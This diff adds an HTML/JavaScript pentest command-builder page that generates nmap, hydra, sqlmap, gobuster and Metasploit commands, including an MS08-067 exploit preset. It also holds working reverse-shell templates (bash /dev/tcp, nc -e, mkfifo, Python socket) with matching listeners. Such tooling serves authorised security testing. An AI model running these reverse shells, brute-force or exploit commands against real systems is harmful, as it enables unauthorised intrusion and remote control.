@@ -1,0 +1,541 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Cyber-Ops Toolkit — Builder</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root{
+      --bg:#0f172a; --card:#0f172a; --panel:#0f1a2b; --muted:#94a3b8;
+      --accent:#3b82f6; --success:#10b981; --danger:#ef4444; --glass: rgba(255,255,255,0.03);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:Inter, "Segoe UI", system-ui, -apple-system, sans-serif;
+      background:linear-gradient(180deg,#071022 0%,var(--bg) 100%); color:#e6eef8; padding:18px;
+    }
+    .wrap{max-width:1100px;margin:0 auto;}
+    header{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    h1{font-size:20px;margin:0;background:linear-gradient(90deg,var(--accent),#8b5cf6);-webkit-background-clip:text;color:transparent}
+    .subtitle{color:var(--muted);font-size:13px}
+
+    .notice{
+      margin:16px 0;padding:12px;border-radius:10px;background:linear-gradient(90deg,#1a2b3a, #0e2133);
+      border:1px solid rgba(255,255,255,0.03); color:#ffd; font-size:13px;
+    }
+
+    .tabs{display:flex;gap:8px;flex-wrap:wrap;margin:16px 0}
+    .tab{background:var(--panel);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);cursor:pointer;color:var(--muted);font-weight:600}
+    .tab.active{background:linear-gradient(90deg,var(--accent),#8b5cf6);color:#001; box-shadow:0 6px 18px rgba(59,130,246,0.12)}
+
+    .grid{display:grid;grid-template-columns:1fr 380px;gap:16px}
+    .panel{background:var(--card);border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03)}
+    .field{margin-bottom:10px}
+    label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
+    input[type=text], select, textarea{
+      width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);
+      background:#071226;color:#e6eef8;font-family:monospace;font-size:14px;
+    }
+    textarea{min-height:80px;resize:vertical}
+    .cmdOut{
+      background:#071226;border-radius:8px;padding:10px;font-family:monospace;font-size:13px;color:#d6e8ff;
+      border:1px solid rgba(255,255,255,0.02); white-space:pre-wrap; word-break:break-word; min-height:54px;
+    }
+    .actions{display:flex;gap:8px;margin-top:8px}
+    button{background:var(--accent);border:none;padding:8px 12px;border-radius:8px;color:#001;font-weight:700;cursor:pointer}
+    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted);font-weight:600}
+    .small{padding:6px 8px;font-size:13px;border-radius:6px}
+
+    /* switches list */
+    .switch-grid{display:flex;flex-direction:column;gap:6px}
+    .switch-grid label{display:flex;gap:8px;align-items:center;font-size:13px;color:var(--muted)}
+
+    /* toast */
+    #toast{position:fixed;right:18px;bottom:18px;padding:10px 14px;border-radius:8px;background:var(--accent);color:#002;display:none;font-weight:700;box-shadow:0 6px 20px rgba(59,130,246,0.12)}
+    #toast.show{display:block}
+
+    /* responsive */
+    @media (max-width:980px){ .grid{grid-template-columns:1fr} .tabs{overflow:auto} .tab{flex:0 0 auto} }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <img src="logo.png" style="width: 100px; height: 100px;" alt="">
+        <h1>Cyber-Ops Toolkit</h1>
+        <div class="subtitle">Command builders · pentest utilities · local use only</div>
+      </div>
+      <div style="text-align:right">
+        <div style="font-size:13px;color:var(--muted)">Theme
+          <button id="themeToggle" class="small btn-ghost">Toggle</button>
+        </div>
+      </div>
+    </header>
+
+    <div class="notice">
+      <strong>Ethics & Legal:</strong> Use this toolkit only on systems you own or have explicit authorization to test. Unauthorized scanning or exploitation is illegal and unethical.
+    </div>
+
+    <div class="tabs" role="tablist" aria-label="Tool sections">
+      <div class="tab active" data-tab="builder">Builder</div>
+      <div class="tab" data-tab="msf">Metasploit</div>
+      <div class="tab" data-tab="hydra">Hydra</div>
+      <div class="tab" data-tab="gobuster">Gobuster</div>
+      <div class="tab" data-tab="ffuf">ffuf</div>
+      <div class="tab" data-tab="sqlmap">SQLMap</div>
+      <div class="tab" data-tab="find">Find</div>
+      <div class="tab" data-tab="rshell">Reverse Shells</div>
+    </div>
+
+    <div class="grid">
+      <!-- Left: main tools (switch with tabs content) -->
+      <div>
+        <!-- Builder panel -->
+        <section id="builder" class="panel" style="display:block">
+          <div class="field">
+            <label>Tool</label>
+            <select id="tool">
+              <option value="nmap">nmap</option>
+              <option value="masscan">masscan</option>
+              <option value="ftp">ftp</option>
+              <option value="smb">smbclient</option>
+              <option value="telnet">telnet</option>
+              <option value="msfconsole">msfconsole</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label>Target IP / Host</label>
+            <input id="ip" type="text" placeholder="e.g. 10.10.10.10 or example.com">
+          </div>
+
+          <div class="field">
+            <label>Port (optional)</label>
+            <input id="port" type="text" placeholder="e.g. 80 or 1-65535">
+          </div>
+
+          <div class="field">
+            <label>Flags / switches</label>
+            <div id="switches" class="switch-grid"></div>
+          </div>
+
+          <div>
+            <label>Generated command</label>
+            <div id="output" class="cmdOut">— generated command appears here —</div>
+            <div class="actions">
+              <button id="copyCmd">Copy</button>
+              <button id="openCmd" class="btn-ghost">Open in new window (preview)</button>
+            </div>
+          </div>
+        </section>
+
+        <!-- Metasploit -->
+        <section id="msf" class="panel" style="display:none">
+          <div class="field"><label>Preset</label>
+            <select id="msf-preset"></select>
+          </div>
+
+          <div class="field"><label>Module</label><input id="msf-module" type="text" placeholder="exploit/module/name"></div>
+          <div class="field"><label>RHOSTS</label><input id="msf-rhosts" type="text" value="RHOSTS"></div>
+          <div class="field" style="display:flex;gap:8px">
+            <div style="flex:1"><label>RPORT</label><input id="msf-rport" type="text" value="21"></div>
+            <div style="flex:1"><label>LHOST</label><input id="msf-lhost" type="text" value="LHOST"></div>
+          </div>
+          <div class="field" style="display:flex;gap:8px">
+            <div style="flex:1"><label>LPORT</label><input id="msf-lport" type="text" value="LPORT"></div>
+            <div style="flex:1"><label>Action</label><input id="msf-action" type="text" value="run"></div>
+          </div>
+          <div class="field"><label>USERNAME (optional)</label><input id="msf-user" type="text"></div>
+          <div class="field"><label>PASSWORD (optional)</label><input id="msf-pass" type="text"></div>
+
+          <div><label>MSF Command</label><div id="msf-output" class="cmdOut">—</div>
+            <div class="actions"><button id="msf-build">Build</button><button id="msf-copy" class="btn-ghost">Copy</button></div>
+          </div>
+        </section>
+
+        <!-- Hydra -->
+        <section id="hydra" class="panel" style="display:none">
+          <div class="field"><label>Protocol</label><input id="hydra-protocol" type="text" placeholder="ssh / ftp / http-form-post"></div>
+          <div class="field" style="display:flex;gap:8px">
+            <div style="flex:1"><label>Target</label><input id="hydra-ip" type="text"></div>
+            <div style="flex:1"><label>Port</label><input id="hydra-port" type="text"></div>
+          </div>
+          <div class="field" style="display:flex;gap:8px">
+            <div style="flex:1"><label>User or -L file</label><input id="hydra-user" type="text" placeholder="user or /path/to/userlist"></div>
+            <div style="flex:1"><label>Pass or -P file</label><input id="hydra-pass" type="text" placeholder="pass or /path/to/passlist"></div>
+          </div>
+          <div class="field"><label>Options</label><input id="hydra-options" type="text" placeholder="extra hydra options"></div>
+          <div><label>Hydra Command</label><div id="hydra-output" class="cmdOut">—</div>
+            <div class="actions"><button id="hydra-copy">Copy</button></div>
+          </div>
+        </section>
+
+        <!-- Gobuster -->
+        <section id="gobuster" class="panel" style="display:none">
+          <div class="field"><label>Mode</label>
+            <select id="gobuster-mode"><option value="dir">dir</option><option value="vhost">vhost</option><option value="dns">dns</option></select>
+          </div>
+          <div class="field"><label>Target</label><input id="gobuster-target" type="text" placeholder="https://example.com or domain"></div>
+          <div class="field"><label>Wordlist</label><input id="gobuster-wordlist" type="text" placeholder="/usr/share/wordlists/raft.txt"></div>
+          <div class="field"><label>Options</label><input id="gobuster-options" type="text" placeholder="-t 50 -x php,txt"></div>
+          <div><label>Gobuster Command</label><div id="gobuster-output" class="cmdOut">—</div>
+            <div class="actions"><button id="gobuster-copy">Copy</button></div></div>
+        </section>
+
+        <!-- ffuf -->
+        <section id="ffuf" class="panel" style="display:none">
+          <div class="field"><label>URL (use FUZZ)</label><input id="ffuf-url" type="text" placeholder="http://example.com/FUZZ"></div>
+          <div class="field"><label>Wordlist</label><input id="ffuf-wordlist" type="text" placeholder="/path/wordlist.txt"></div>
+          <div class="field"><label>Options</label><input id="ffuf-options" type="text" placeholder="-mc 200"></div>
+          <div><label>FFUF Command</label><div id="ffuf-output" class="cmdOut">—</div>
+            <div class="actions"><button id="ffuf-copy">Copy</button></div></div>
+        </section>
+
+        <!-- sqlmap -->
+        <section id="sqlmap" class="panel" style="display:none">
+          <div class="field"><label>URL</label><input id="sqlmap-url" type="text" placeholder="http://target/?id=1"></div>
+          <div class="field"><label>Data (POST)</label><input id="sqlmap-data" type="text" placeholder="param1=value1&param2=value2"></div>
+          <div class="field"><label>Cookies</label><input id="sqlmap-cookies" type="text" placeholder="PHPSESSID=..."></div>
+          <div class="field"><label>Headers (raw)</label><input id="sqlmap-headers" type="text" placeholder="User-Agent: ..."></div>
+          <div class="field"><label>Options</label><input id="sqlmap-options" type="text" placeholder="--dbs --level=3"></div>
+          <div><label>SQLMap Command</label><div id="sqlmap-output" class="cmdOut">—</div>
+            <div class="actions"><button id="sqlmap-copy">Copy</button></div></div>
+        </section>
+
+        <!-- find -->
+        <section id="find" class="panel" style="display:none">
+          <div class="field">
+            <label>OS</label>
+            <select id="find-os"><option value="linux">Linux</option><option value="windows">Windows</option></select>
+          </div>
+          <div class="field">
+            <label>Type</label>
+            <select id="find-type">
+              <option value="all">All files</option>
+              <option value="ext">By extension</option>
+              <option value="exact">Exact name</option>
+              <option value="size">By size</option>
+              <option value="mtime">Modified time</option>
+              <option value="perm">Permissions</option>
+            </select>
+          </div>
+          <div class="field" id="find-label-field">
+            <label id="find-label">Value</label>
+            <input id="find-name" type="text" placeholder="e.g. txt or secrets.txt or +10M">
+          </div>
+          <div class="field"><label>Extra options</label><input id="find-options" type="text" placeholder="e.g. -iname '*.log'"></div>
+
+          <div><label>Find Command</label><div id="find-output" class="cmdOut">—</div>
+            <div class="actions"><button id="find-copy">Copy</button></div></div>
+        </section>
+
+        <!-- Reverse shells -->
+        <section id="rshell" class="panel" style="display:none">
+          <div style="display:flex;gap:8px;margin-bottom:8px">
+            <div style="flex:1"><label>LHOST</label><input id="rs-ip" type="text" placeholder="LHOST"></div>
+            <div style="flex:1"><label>LPORT</label><input id="rs-port" type="text" placeholder="LPORT"></div>
+          </div>
+          <div class="field"><label>Search</label><input id="rs-search" type="text" placeholder="filter templates"></div>
+
+          <div style="display:flex;gap:8px">
+            <div style="flex:1">
+              <label>Templates</label>
+              <div id="rs-list" class="cmdOut" style="min-height:120px;overflow:auto">—</div>
+            </div>
+            <div style="width:320px">
+              <label>Payload</label>
+              <div id="rs-payload" class="cmdOut" style="min-height:120px">—</div>
+              <div class="actions">
+                <button id="rs-copy">Copy Payload</button>
+                <button id="rs-copy-listener" class="btn-ghost">Copy Listener</button>
+              </div>
+              <div style="margin-top:8px;color:var(--muted);font-size:12px">Listener (example): <span id="rs-listener">nc -lvnp PORT</span></div>
+            </div>
+          </div>
+        </section>
+      </div>
+
+      <!-- Right: contextual info and quick actions -->
+      <aside>
+        <div class="panel">
+          <div style="font-size:13px;color:var(--muted);margin-bottom:8px">Quick actions</div>
+          <div style="display:flex;flex-direction:column;gap:8px">
+            <button id="clearAll" class="btn-ghost">Clear Inputs</button>
+            <button id="prefillDemo">Load Demo (safe)</button>
+          </div>
+        </div>
+
+        <div class="panel" style="margin-top:12px">
+          <div style="font-size:13px;color:var(--muted);margin-bottom:8px">Last generated</div>
+          <div id="lastGenerated" class="cmdOut">—</div>
+        </div>
+      </aside>
+    </div>
+
+    <div id="toast">copied</div>
+  </div>
+
+  <script>
+  // ---------- Utilities ----------
+  const $ = id => document.getElementById(id);
+  function toast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('show'); t.style.display='block'; setTimeout(()=>{t.classList.remove('show'); t.style.display='none'},1800) }
+  function safeCopy(text,msg='copied'){ navigator.clipboard?.writeText(text).then(()=>toast(msg)).catch(()=>alert('copy failed')) }
+
+  // ---------- Theme ----------
+  const themeToggle = document.getElementById('themeToggle');
+  themeToggle?.addEventListener('click', ()=> {
+    document.documentElement.classList.toggle('light');
+    toast('theme toggled');
+  });
+
+  // ---------- Tabs ----------
+  document.querySelectorAll('.tab').forEach(t=>{
+    t.addEventListener('click', ()=> {
+      document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+      t.classList.add('active');
+      const tab = t.dataset.tab;
+      // hide/show sections
+      document.querySelectorAll('section').forEach(sec=>{
+        sec.style.display = (sec.id === tab) ? 'block' : 'none';
+      });
+    });
+  });
+
+  // ---------- Tools metadata ----------
+  const tools = {
+    nmap:{
+      switches: ['-sS (TCP SYN)','-sV (service versions)','-A (os & script)','-O (os detect)','--script vuln']
+    },
+    masscan:{ switches: ['--rate 1000','--banners','--exclude 255.255.255.255']},
+    ftp:{ switches: []},
+    smbclient:{ switches: []},
+    telnet:{ switches: []},
+    msfconsole:{ switches: []}
+  };
+
+  // Render switches dynamically for selected tool
+  const toolSel = $('tool'), switchesBox = $('switches'), ipIn = $('ip'), portIn = $('port'), out = $('output'), lastGenerated = $('lastGenerated');
+  function renderSwitches(){
+    const key = toolSel.value;
+    const list = tools[key] ? tools[key].switches : [];
+    switchesBox.innerHTML = '';
+    list.forEach((s,i)=>{
+      const id = `sw-${key}-${i}`;
+      const label = document.createElement('label');
+      label.innerHTML = `<input type="checkbox" id="${id}" data-flag="${s.split(' ')[0]}"> ${s}`;
+      switchesBox.appendChild(label);
+    });
+  }
+
+  function buildCmd(){
+    const tool = toolSel.value, ip = ipIn.value.trim(), port = portIn.value.trim();
+    if(!ip){ out.textContent = '← enter IP/host'; return; }
+    const flags = Array.from(switchesBox.querySelectorAll('input:checked')).map(ch=>ch.dataset.flag);
+    let cmd = '';
+    if(tool === 'nmap'){
+      cmd = `nmap ${flags.join(' ')} ${port ? '-p '+port : ''} ${ip}`.replace(/\s+/g,' ').trim();
+    } else if(tool === 'masscan'){
+      cmd = `masscan ${ip}${port ? ' -p'+port : ''} ${flags.join(' ')}`.trim();
+    } else if(tool === 'ftp'){
+      cmd = `ftp ${ip} ${port?port:''}`.trim();
+    } else if(tool === 'smbclient'){
+      cmd = `smbclient //${ip}/share ${port?'-p '+port:''} -U <user>`;
+    } else if(tool === 'telnet'){
+      cmd = `telnet ${ip} ${port || 23}`;
+    } else if(tool === 'msfconsole'){
+      cmd = `msfconsole -q -x "use exploit/...; set RHOST ${ip}; ${port?'set RPORT '+port+'; ':''}run"`;
+    }
+    out.textContent = cmd || '—';
+    lastGenerated.textContent = cmd || lastGenerated.textContent;
+  }
+
+  renderSwitches();
+  buildCmd();
+  toolSel.addEventListener('change', ()=>{ renderSwitches(); buildCmd(); });
+  [ipIn,portIn].forEach(e=>e.addEventListener('input', buildCmd));
+  switchesBox.addEventListener('change', buildCmd);
+
+  $('copyCmd').addEventListener('click', ()=> { if(out.textContent && !out.textContent.startsWith('←')) safeCopy(out.textContent,'Command copied!') });
+  $('openCmd').addEventListener('click', ()=> window.open('about:blank','_blank').document.write('<pre>'+out.textContent+'</pre>'));
+
+  // ---------- Reverse shells ----------
+  const templates = [
+    {name:'Bash -i', cmd:'bash -i >& /dev/tcp/{ip}/{port} 0>&1'},
+    {name:'nc -e', cmd:'nc {ip} {port} -e /bin/sh'},
+    {name:'mkfifo nc', cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'},
+    {name:'Python', cmd:"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"},
+  ];
+  function renderRsList(){
+    const term = ($('rs-search')?.value || '').toLowerCase();
+    const list = $('rs-list'); list.innerHTML = '';
+    templates.filter(t=>t.name.toLowerCase().includes(term)).forEach(t=>{
+      const div = document.createElement('div');
+      div.style.padding='6px'; div.style.borderBottom='1px dashed rgba(255,255,255,0.03)';
+      div.style.cursor='pointer'; div.textContent = t.name;
+      div.onclick = ()=> generatePayload(t);
+      list.appendChild(div);
+    });
+  }
+  function generatePayload(t){
+    const ip = $('rs-ip').value.trim() || 'LHOST';
+    const port = $('rs-port').value.trim() || 'LPORT';
+    const cmd = t.cmd.replace(/\{ip\}/g,ip).replace(/\{port\}/g,port);
+    $('rs-payload').textContent = cmd;
+    $('rs-listener').textContent = `nc -lvnp ${port}`;
+  }
+  ['rs-ip','rs-port','rs-search'].forEach(id=>{ $(id)?.addEventListener('input', renderRsList) });
+  $('rs-copy')?.addEventListener('click', ()=> safeCopy($('rs-payload').textContent||'','Payload copied!'));
+  $('rs-copy-listener')?.addEventListener('click', ()=> safeCopy($('rs-listener').textContent||'','Listener copied!'));
+  renderRsList();
+
+  // ---------- MSF builder ----------
+  const msfPresets = [
+    {key:'ftp_login', label:'FTP – Login Scanner', module:'auxiliary/scanner/ftp/ftp_login', rport:21, action:'run'},
+    {key:'smb_ms08_067', label:'SMB – MS08-067', module:'exploit/windows/smb/ms08_067_netapi', rport:445, action:'exploit'},
+    {key:'ssh_login', label:'SSH – Login Scanner', module:'auxiliary/scanner/ssh/ssh_login', rport:22, action:'run'}
+  ];
+  const presetSel = $('msf-preset');
+  msfPresets.forEach(p=>{ const o=document.createElement('option'); o.value=p.key; o.textContent=p.label; presetSel.appendChild(o) });
+  function applyPreset(key){
+    const p = msfPresets.find(x=>x.key===key); if(!p) return;
+    $('msf-module').value = p.module; $('msf-rport').value = p.rport; $('msf-action').value = p.action;
+    buildMsf();
+  }
+  presetSel.addEventListener('change', ()=> applyPreset(presetSel.value));
+  function buildMsf(){
+    const mod = $('msf-module').value.trim() || 'exploit/...';
+    const rh = $('msf-rhosts').value.trim() || 'RHOSTS';
+    const rp = $('msf-rport').value.trim() || 'RPORT';
+    const lh = $('msf-lhost').value.trim() || 'LHOST';
+    const lp = $('msf-lport').value.trim() || 'LPORT';
+    const un = $('msf-user').value.trim();
+    const pw = $('msf-pass').value.trim();
+    const act = $('msf-action').value.trim() || 'run';
+    let cmd = `msfconsole -q -x "use ${mod}; set RHOSTS ${rh}; set RPORT ${rp}; set LHOST ${lh}; set LPORT ${lp}; `;
+    if(un) cmd += `set USERNAME ${un}; `;
+    if(pw) cmd += `set PASSWORD ${pw}; `;
+    cmd += `${act}"`;
+    $('msf-output').textContent = cmd;
+  }
+  ['msf-module','msf-rhosts','msf-rport','msf-lhost','msf-lport','msf-user','msf-pass','msf-action'].forEach(id=>{
+    $(id)?.addEventListener('input', buildMsf);
+  });
+  $('msf-build')?.addEventListener('click', buildMsf);
+  $('msf-copy')?.addEventListener('click', ()=> safeCopy($('msf-output').textContent||'','MSF command copied!'));
+  applyPreset(msfPresets[0].key);
+
+  // ---------- Hydra ----------
+  function buildHydra(){
+    const proto = $('hydra-protocol').value.trim(), ip = $('hydra-ip').value.trim(), port = $('hydra-port').value.trim();
+    let user = $('hydra-user').value.trim(), pass = $('hydra-pass').value.trim(), opts = $('hydra-options').value.trim();
+    if(!proto || !ip || (!user && !pass)){ $('hydra-output').textContent = 'Please fill required fields.'; return; }
+    // allow user to pass file paths by starting with -L/-P or treat as single user/pass
+    const userPart = user.startsWith('-L') || user.startsWith('-l') ? user : (user.includes('/') ? `-L ${user}` : `-l ${user}`);
+    const passPart = pass.startsWith('-P') || pass.startsWith('-p') ? pass : (pass.includes('/') ? `-P ${pass}` : `-p ${pass}`);
+    const portPart = port ? `-s ${port}` : '';
+    const cmd = `hydra ${userPart} ${passPart} ${portPart} ${opts} ${ip} ${proto}`.replace(/\s+/g,' ').trim();
+    $('hydra-output').textContent = cmd;
+  }
+  ['hydra-protocol','hydra-ip','hydra-port','hydra-user','hydra-pass','hydra-options'].forEach(id=>$(id)?.addEventListener('input', buildHydra));
+  $('hydra-copy')?.addEventListener('click', ()=> safeCopy($('hydra-output').textContent||'','Hydra command copied!'));
+
+  // ---------- Gobuster ----------
+  function buildGobuster(){
+    const mode = $('gobuster-mode').value, target = $('gobuster-target').value.trim(), wordlist = $('gobuster-wordlist').value.trim();
+    const opts = $('gobuster-options').value.trim();
+    if(!target || !wordlist){ $('gobuster-output').textContent = 'Please enter target and wordlist.'; return; }
+    let base = `gobuster ${mode}`;
+    if(mode === 'dir' || mode === 'vhost') base += ` -u ${target} -w ${wordlist}`;
+    else if(mode === 'dns') base += ` -d ${target} -w ${wordlist}`;
+    $('gobuster-output').textContent = (base + ' ' + opts).trim();
+  }
+  ['gobuster-mode','gobuster-target','gobuster-wordlist','gobuster-options'].forEach(id=>$(id)?.addEventListener('input', buildGobuster));
+  $('gobuster-copy')?.addEventListener('click', ()=> safeCopy($('gobuster-output').textContent||'','Gobuster command copied!'));
+
+  // ---------- ffuf ----------
+  function buildFfuf(){ const url = $('ffuf-url').value.trim(), w = $('ffuf-wordlist').value.trim(), o = $('ffuf-options').value.trim();
+    if(!url || !w){ $('ffuf-output').textContent = '# Provide URL and wordlist'; return; }
+    $('ffuf-output').textContent = `ffuf -u ${url} -w ${w} ${o}`.trim();
+  }
+  ['ffuf-url','ffuf-wordlist','ffuf-options'].forEach(id=>$(id)?.addEventListener('input', buildFfuf));
+  $('ffuf-copy')?.addEventListener('click', ()=> safeCopy($('ffuf-output').textContent||'','FFUF command copied!'));
+
+  // ---------- sqlmap ----------
+  function buildSqlmap(){
+    const url = $('sqlmap-url').value.trim(), data = $('sqlmap-data').value.trim(), cookies = $('sqlmap-cookies').value.trim();
+    const headers = $('sqlmap-headers').value.trim(), opts = $('sqlmap-options').value.trim();
+    if(!url){ $('sqlmap-output').textContent = '# Please provide a target URL.'; return; }
+    let cmd = `sqlmap -u "${url}"`;
+    if(data) cmd += ` --data="${data}"`;
+    if(cookies) cmd += ` --cookie="${cookies}"`;
+    if(headers) cmd += ` --headers="${headers}"`;
+    if(opts) cmd += ` ${opts}`;
+    $('sqlmap-output').textContent = cmd.trim();
+  }
+  ['sqlmap-url','sqlmap-data','sqlmap-cookies','sqlmap-headers','sqlmap-options'].forEach(id=>$(id)?.addEventListener('input', buildSqlmap));
+  $('sqlmap-copy')?.addEventListener('click', ()=> safeCopy($('sqlmap-output').textContent||'','SQLMap command copied!'));
+
+  // ---------- find ----------
+  function updateFindField(){
+    const type = $('find-type').value;
+    const lbl = $('find-label-field');
+    if(type === 'all'){ lbl.style.display='none'; $('find-name').value=''; }
+    else { lbl.style.display='block'; $('find-name').placeholder = type==='ext'?'e.g. log': type==='exact'?'e.g. secret.txt': type==='size'?'e.g. +10M':'value'; }
+    buildFind();
+  }
+  function buildFind(){
+    const os = $('find-os').value, type = $('find-type').value, value = $('find-name').value.trim(), options = $('find-options').value.trim();
+    if(os === 'linux'){
+      let cmd = `sudo find / -type f`;
+      if(type==='ext'){ if(!value){$('find-output').textContent='# Enter extension';return;} const ext = value.startsWith('.')?value.slice(1):value; cmd += ` -name "*.${ext}"`; }
+      else if(type==='exact'){ if(!value){$('find-output').textContent='# Enter filename';return;} cmd += ` -name "${value}"`; }
+      else if(type==='size'){ if(!value){$('find-output').textContent='# Enter size';return;} cmd += ` -size ${value}`; }
+      else if(type==='mtime'){ if(!value){$('find-output').textContent='# Enter mtime';return;} cmd += ` -mtime ${value}`; }
+      else if(type==='perm'){ if(!value){$('find-output').textContent='# Enter perm';return;} cmd += ` -perm ${value}`; }
+      if(options) cmd += ` ${options}`;
+      cmd += ` 2>/dev/null`;
+      $('find-output').textContent = cmd;
+    } else {
+      // windows
+      let cmd = '';
+      if(type==='all') cmd = `dir C:\\ /s /b`;
+      else if(type==='ext'){ if(!value){$('find-output').textContent='# Enter extension';return;} const ext=value.startsWith('.')?value.slice(1):value; cmd = `dir C:\\*.${ext} /s /b`; }
+      else if(type==='exact'){ if(!value){$('find-output').textContent='# Enter filename';return;} cmd = `dir C:\\${value} /s /b`; }
+      else cmd = `# filters like size/mtime/perm are not directly supported by dir`;
+      if(options && !cmd.startsWith('#')) cmd += ` ${options}`;
+      $('find-output').textContent = cmd;
+    }
+  }
+  ['find-os','find-type','find-name','find-options'].forEach(id=>$(id)?.addEventListener('input', id==='find-type'?updateFindField:buildFind));
+  updateFindField();
+
+  // ---------- quick actions ----------
+  $('clearAll')?.addEventListener('click', ()=>{
+    document.querySelectorAll('input[type=text]').forEach(i=>i.value=''); document.querySelectorAll('textarea').forEach(t=>t.value='');
+    renderSwitches(); buildCmd(); renderRsList(); toast('inputs cleared');
+  });
+  $('prefillDemo')?.addEventListener('click', ()=>{
+    $('ip').value='10.10.10.10'; $('port').value='80'; $('tool').value='nmap'; renderSwitches(); buildCmd(); toast('demo loaded');
+  });
+
+  // ---------- copy buttons generic binding ----------
+  document.querySelectorAll('button').forEach(btn=>{
+    // avoid interfering with already added listeners that use safeCopy
+    if(btn.id && btn.id.endsWith('-copy') && !btn.onclick){
+      btn.addEventListener('click', ()=>{
+        const targetId = btn.id.replace('-copy','') + (btn.id==='copyCmd' ? '' : '-output');
+        const fallback = btn.dataset.target || '';
+        const txt = $(targetId)?.textContent || fallback || '';
+        if(txt) safeCopy(txt, 'copied!');
+      });
+    }
+  });
+
+  // Keep last generated synced
+  setInterval(()=>{ if(out.textContent && out.textContent!=='← enter IP/host') lastGenerated.textContent = out.textContent }, 1500);
+
+  // End script
+  </script>
+</body>
+</html>
